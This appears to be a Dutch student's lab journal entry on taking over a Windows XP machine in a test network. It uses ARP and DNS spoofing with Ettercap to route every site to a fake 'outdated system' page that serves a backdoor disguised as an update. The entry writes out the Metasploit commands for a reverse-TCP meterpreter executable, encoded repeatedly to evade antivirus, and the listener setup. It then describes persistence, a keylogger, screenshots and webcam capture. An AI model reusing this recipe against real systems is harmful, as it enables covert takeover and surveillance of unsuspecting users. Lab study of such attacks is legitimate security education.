#02/01/2016

Doel van vandaag is om via een backdoor de controle te kunnen overnemen van ons victim. We zullen dit doen via Metasploit. Ook willen we dat de hack werkt in alle browsers (niet zoals vorig keer enkel IE).

Hoe gaan we dit doen? We zullen via een DNS spoof wijsmaken dat elke hostname zich bevind op het ip adres van de hacker! Dit doen we door middel van een MITM (Arp spoof). Elke keer de victim vraagt waar bevind google.com, facebook.be, ... zich antwoorden we dus. 

Tegelijk hosten we een website op de hacker (Kali PC), deze zal de victim zien op elke "site"! Op deze site zetten we een valse waarschuwing over niet up ge date systeem! We maken hem wijs dat we uit voorzorg de internettoegang ontzegd hebben. We bieden een update die zogezegd een oplossing biedt, maar eigenlijk is het een kwaadaarige payload met een backdoor in :)

We hebben dit eerst geprobeerd met MITMf, die zou ook een DNS spoof module moeten bevatten. [Dit is een blogpost](http://sign0f4.blogspot.be/2014/07/mitmf-update-spoof-plugin_23.html) die geschreven is door de maker van MITMf. Volgens mij is het gewoon verrouderd, want uiteraard werkt dit niet... Getest op apt-get versie en met de laatste versie op GitHub.

Heb ik maar besloten op Ettercap te gebruiken. We hebben nu geen nood om HTTPS te omzeilen. We gaan immers geen bestaande sites bezoeken. En we vallen een Windows XP computer aan met Firefox 12 / Internet Explorer 8. Dus geen nood om HSTS te omzeilen!

We hebben een paar tuturials gevolgd maar uiteraard werkte er enkele. [Deze video](https://www.youtube.com/watch?v=5xoFFIcUaIA) is diegene met de beste uitleg, staan enkele fouten in zoals de instellingen van etter.conf zijn niet nodig. Deze zijn enkel nodig wil je dat de victim nog de sites kan bezoeken, bij ons is dit niet nodig we serveren onze eigen site. 

Het grootte probleem was dat ik niet beschikte over het etter.dns bestand. Ik dacht geen probleem het niet dat ik het ging gebruiken (alles moet naar mijn computer, er moet dus maar 1 DNS entry in). Maar na alles juist in te stellen werkte het uiteraard niet.

Dan heb ik besloten om Ettercap te gebruiken via de terminal. Maar al snel was duidelijk dat de meeste tuturials out dated waren, commando's die niet meer werken of anders moesten gebruikt worden...

Ik ben ondertussen de tel kwijt geraakt hoevaak "werkende" tuturials niet werken bij ons. Blijkbaar is documentatie en compatibiliteit met oudere versies houden niet zo belangrijk. Ik (Brecht Carlier) was van plan hierover te bloggen, maar ik ben dit gewoon niet meer van plan. Als iemand binnen een jaar mijn post leest, is hij waarschijnlijk totaal niet meer correct....

Ik heb hierna besloten Ettercap te verwijderen *apt-get remove ettercap-common* om hierna terug te installeren *apt-get install ettercap-common*. Het resultaat de grafische versie van ettercap werkt niet (start niet meer op). Maar geen probleem we waren ervan overtuigd dat het wel ging werken als we de laptop herstarten. Bleek jammer genoeg niet het geval te zijn. Na nog talloze apt-get commando's begon de moed in onze schoenen te zaken. Toen heb ik besloten om via de source code ettercap (GitHub) ettercap te installeren. Er gebeurde iets toen we het opstarten maar daarna had ik nog nooit zoveel errors op één scherm gezien.

We waren het zo beu dat ik gewoon mijn laptop heb uitgezet. We hebben verder gedaan via Virtualbox. Daar hadden we wel al de etter.dns file staan, onze hoop steeg. Na alles juist te doen, werkte het nog steeds niet.

Na 5u verder hebben we letterlijk niets bereikt. We besluiten om even te stoppen dit gaat toch niet verder zo....

Mijn volgende plan was om gewoon volledig Kali opnieuw te installeren op mijn laptop. En ook ineens goed. Alles wat op mijn laptop stond (Windows 10, Windows Server 2012 R2, Linux Mint, Kali) heb ik verwijderd. En enkel Kali opnieuw opgezet. Alles terug geconfigureerd (taal, toetsenbord, ...)  en we waren terug up and running. Alles werkt terug normaal buiten de print screen toets.

Als eerste MITMf terug opnieuw geïnstalleerd (dit moet uiteraard eerst terug werken). En daarna alle stappen van Ettercap opnieuw uitgevoerd. Wonder boven wonder begonnen dinges te werken. Ik gebruikte eerst de standaard etter.dns file. Deze zal indien het IP adres van microsoft.com gevraagd wordt het IP doorsturen van linux.org (trololo). Wat er nu eigenlijk verkeerd was al dit tijd, we hebben geen idee.

Daarna hebben we de etter.dns file aangepast dat elke hostname zich bevind op onze Kali computer:

>\*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.2.18

Nu voor we dit konden uittesten, moesten we uiteraard een webserver hebben draaien op onze Kali computer. Uiteraard doen we dit met apache!

> sudo service apache2 start

Nu onze webserver opstaat, passen we de index.html file (/var/www/html/) aan naar onze eigen wensen. We verzinnen een tekst, en voegen een download link toe. Voorlopig laten we deze even naar niets wijzen (href) we hebben onze backdoor nog niet gecreëerd. We testen de site door te surfen naar localhost op onze hacker (Kali). Het ziet er goed uit. Ik test even de site manueel op de Windows XP computer (surfen naar 192.168.2.18). Dit werkt ook.

We voeren ons DNS spoof aanval uit. Eerst dus ARP spoofing opzetten. Even verfieren of dit werkt op de Win XP computer d.m.v. arp -a. Alles werkt normaal ik ben instaat om pakketjes te sniffen (ik zie een dhcp pakketje voorbij komen en wat achtergrond http verkeer). Ik zet de dnsspoof plugin op. Ik flush voor de zekerheid de dns cache op de WinXP computer. En surf dan naar microsoft.com en ja hoor daar staat hij onze eigen mooie site! 

Er is nog een klein probleempje, als je bijvoorbeeld zoekt met google wordt de url aangepast met een zoek query. Deze url bestaat niet op onze server. Daar staat enkel een index.html pagina op. We moeten nog instellen dat als de site niet gevonden wordt op mijn server dat hij automatisch geredirect wordt naar de index.html pagina. 

Dit heb ik gedaan d.m.v. [fallbackresource](http://httpd.apache.org/docs/2.2/mod/mod_dir.html#fallbackresource). Dit kun je instellen in je apache settings.

> FallbackResource /index.html

Dit heb ik toegevoegd onder *DocumentRoot* in 000-default.conf in /etc/apache2/sites-available.</br>
Zo dit probleem is ook opgelost. Het maakt niet uit wat je invuld, je komt altijd terecht op onze website. Deel 1 van het plan is geslaagd.

Nu was het tijd voor Metasploit. We zullen gebruik maken de reverse_tcp exploit. 

**TODO: reverse_tcp explout uitleggen!**

We moeten deze exploit in een uitvoerbaar bestand steken, we zullen dus een .exe genereren.

> use windows/meterpreter/reverse_tcp </br>
> set LHOST 192.168.2.18 </br>
> generate -e x86/shikata_ga_nai -i 30 -t exe -f win32update1536.exe

De '-e' staat voor enconding, d.m.v. de '-i 30' specifieren dat we de .exe 30 keer encoderen. Zo wordt de exploit moeilijker vindbaar voor virusscaners. Tegenwoordig (vanaf +- 2010, tijd gaat zo snel) zal dit niet meer voldoende zijn. Je kunt echter wel een paar lagen van ecnyptie toevoegen aan het bestand. We hebben dit niet gedaan, maar er zijn hier genoeg tuturials te vinden op het internet.

De *"-t echo"* specifiert dat er een .exe moet uit komen. We geven onze backdoor een naam dit doen we d.m.v. *'-f win32update1536.exe"*.

We hebben geen poort ingesteld, dit betekend dat we gebruik maken van de standaard poort 4444. Je kunt trouwens zien bij elke backdoor welke informatie verplicht moet ingesteld worden d.m.v. het commando *"info"*. Bij ons was enkel LHOST verplicht (eigen IP adres van de hacker).

Bron:
- [Forum met uitleg](https://evilzone.org/tutorials/metasploit-payload-tutorial/)
- [Officiële documentatie](https://www.offensive-security.com/metasploit-unleashed/generating-payloads/)

Nu we onze backdoor gemaakt hebben (ons gegeneerd .exe bestand) plaatsen we deze in de /var/www/html/ map. We vullen als path voor onze link (href) de naam van de backdoor in. Wij hebben deze win32update1536.exe genoemd. Indien je nu klikt op de link zal je de file downloaden.

We moeten nu onze metasploit zo instellen dat we luisteren naar onze backdoor. 

> msfconsole </br>
> use explout/multi/handler </br>
> set PAYLOAD windows/meterpreter/reverse_tcp </br>
> set LHOST 192.168.2.18 </br>
> exploit


Ik heb geen poort ingesteld omdat we de standaard poort gebruikt hebben (4444). Vanaf nu luisteren we naar binnenkomende response van onze backdoor. We wachten dus tot iemand de file download.

Ik test het uit. Je ziet dat de metasploit console reageert, maar hij kan geen meterpreter sessie starten. (Niets gaat van de 1ste keer). De fout was zeer bizar. De sessie starte maar stopte een paar minuten later van een timeout (EOFError). Ik kon maar één link vinden met een gelijkaardig probleem [LINK](https://community.rapid7.com/thread/2796). Maar de suggesties loste het probleem niet op. Na een paar keer proberen had ik een andere "error". Hij bleef hangen op "sending stage metasploit"...

Dit probleem kwam frequenter voor op google. Maar ook hier vond ik niets dat van toepassing is van mijn probleem. Na een paar keer proberen werkte het uit het niets ineens. (Kali dacht waarschijnlijk dat ik tijd teveel heb). Ach ja ik mag niet klagen het werkt!

Zo vanaf nu kunnen we alles wat we met metasploit kunnen, uitvoeren. Het eerste wat je best doet is de backdoor "verplaatsen" naar een andere .exe (migrate). Zie gast sessie (Ernst & Young). Je zorgt er best ook voor dat je de backdoor automatisch wordt uitgevoerd nadat Windows herstart wordt, anders moet hij de file terug downloaden voor je toegang kunt krijgen.

We hebben hierna wat rond gespeeld met Metasploit. Wat basis commando's:
* download => Bestand downoaden op victim
* getuid => Kijken als welke "gebruiker" onze backdoor runt
* ipconfig => ipconfig uitvoeren op victim
* ps => "Taakbeheer", kijken welke programma's er uitgevoerd worden op de victim
* webcam_snap => Foto nemen via webcam. Kreeg de drivers niet werkend op Windows XP (jammeeuuurr)

Voor nog meer basis commando's: [KLIK HIER](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

We hebben ook nog printscreen genomen van de victim, zo kunnen we constant zien wat de gebruiker doet. Ook hebben we een keylogger toegevoegd aan onze backdoor. Nu kunnen we ook zien wat de gebruiker constant invuld!

TODO: Dit nog verder uitleggen.


###Geleerde commandos
Bestanden zoeken (zoek naar etter.dns)
> locate etter.dns

####TODO: 
* 27112015 -> commando's verklaren 
* 29122015 -> verder afmaken
* mail script
* 28122015 -> ether.conf
